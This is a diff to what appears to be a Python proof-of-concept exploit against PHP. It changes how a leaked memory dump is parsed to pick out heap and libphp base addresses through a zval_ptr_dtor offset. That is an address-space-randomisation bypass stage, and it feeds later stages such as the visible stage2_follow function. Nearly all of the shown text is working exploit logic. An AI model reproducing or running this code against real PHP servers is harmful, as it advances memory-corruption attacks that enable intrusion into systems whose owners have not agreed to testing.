@@ -358,6 +358,24 @@ def stage2_follow(host: str, port: int, path: str, timeout: float) -> bytes:
         sock.close()
 
 
+def select_module_candidate(
+    candidates: list[tuple[int, int, int]],
+) -> tuple[int, int, int]:
+    candidates.sort(reverse=True)
+    if not candidates:
+        raise PocError("disclosure contained no repeated module candidate")
+    if len(candidates) > 1:
+        winner = candidates[0][0]
+        runner_up = candidates[1][0]
+        if winner < runner_up * 2 or winner - runner_up < 4:
+            rendered = [
+                (count, hex(pointer), hex(base))
+                for count, pointer, base in candidates
+            ]
+            raise PocError(f"module candidate selection is ambiguous: {rendered}")
+    return candidates[0]
+
+
 def derive_bases(leak: bytes) -> tuple[int, int, int, int]:
     pointer_items = []
     for offset in range(0, len(leak) - 7, 8):
@@ -378,11 +396,7 @@ def derive_bases(leak: bytes) -> tuple[int, int, int, int]:
         base = pointer - PROFILE["zval_ptr_dtor"]
         if count >= 4 and base > 0 and base & 0xFFF == 0:
             candidates.append((count, pointer, base))
-    candidates.sort(reverse=True)
-    if len(candidates) != 1:
-        rendered = [(count, hex(pointer), hex(base)) for count, pointer, base in candidates]
-        raise PocError(f"module candidate selection is ambiguous: {rendered}")
-    dtor_count, dtor, libphp = candidates[0]
+    dtor_count, dtor, libphp = select_module_candidate(candidates)
     return heap, heap_count, libphp, dtor_count
 
 
